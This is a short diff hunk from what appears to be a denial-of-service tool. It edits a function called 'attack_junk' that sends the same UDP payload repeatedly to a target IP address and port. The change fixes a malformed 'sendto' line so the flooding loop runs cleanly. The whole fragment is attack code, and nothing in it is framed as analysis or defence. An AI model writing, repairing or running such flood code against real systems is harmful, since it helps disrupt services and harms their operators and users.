@@ -136,7 +136,7 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        s.sendto(payload  s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
